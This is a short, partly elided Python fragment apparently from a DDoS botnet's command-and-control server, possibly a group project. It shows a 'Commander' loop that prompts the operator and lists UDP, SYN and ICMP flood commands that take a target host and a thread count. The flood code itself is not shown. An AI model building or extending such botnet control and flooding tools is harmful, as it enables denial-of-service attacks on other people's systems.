...
def Commander(sock):#cnc server
	...
	while True:
		...
		sock.send('group9@cnc_server#'.encode())#if u run this on windows, it may has some bug, idk why so,i use linux.
		...
		if len(cmd_str):
			...
			if cmd_str == '?' or cmd_str == 'help' or cmd_str == '?\r\n' or cmd_str == 'help\r\n':
				sock.send('\r\n#-- Commands --#\r\n'.encode())
				sock.send('  UDP    Flood: 	!udp   host threads size\r\n'.encode())    #udp flood
				sock.send('  SYN    Flood: 	!syn   host threads\r\n'.encode())         #syn flood
				sock.send('  ICMP   Flood: 	!icmp  host threads\r\n'.encode())          #icmp flood							
